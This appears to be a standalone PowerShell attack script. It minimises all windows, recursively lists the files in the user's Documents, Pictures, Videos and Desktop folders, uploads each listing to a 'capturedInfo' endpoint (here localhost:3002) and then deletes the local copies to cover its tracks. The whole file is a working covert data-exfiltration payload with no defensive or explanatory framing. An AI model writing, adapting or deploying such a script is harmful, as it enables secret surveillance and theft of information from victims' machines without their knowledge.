# Hide all windows
$null = (New-Object -ComObject Shell.Application).MinimizeAll()

# List of special folder names
$specialFolders = @('MyDocuments', 'MyPictures', 'MyVideo', 'Desktop')

# Define the remote URL
$remoteURL = "http://localhost:3002/capturedInfo"

# Create a WebClient object
$webClient = New-Object System.Net.WebClient

foreach ($folderName in $specialFolders) {
    $directory = [System.Environment]::GetFolderPath($folderName)

    if (Test-Path -Path $directory -PathType Container) {
        # Create a file name using the folder name
        $fileName = Join-Path $directory ($folderName + ".txt")
        
        # Get the list of files and directories in the current directory and its subdirectories
        $fileItems = Get-ChildItem $directory -File -Recurse | ForEach-Object { $_.FullName }
        
        # Save the list of files and directories to the file with the folder name
        $fileItems | Out-File -FilePath $fileName

        try {
            # Upload the file to the remote URL
            $response = $webClient.UploadFile($remoteURL, $fileName)
            $responseString = [System.Text.Encoding]::UTF8.GetString($response)
            Write-Host "File uploaded successfully: $fileName"
            Write-Host "Server Response:"
            Write-Host $responseString
        } catch {
            Write-Host "Error uploading file $fileName : $_"
        } finally {
            # Delete the file after upload
            Remove-Item -Path $fileName -Force
            Write-Host "File deleted: $fileName"
        }
        
    } else {
        Write-Host "Directory not found for folder: $folderName"
    }
}

# Dispose of the WebClient object
$webClient.Dispose()

# Close after processing all folders
exit
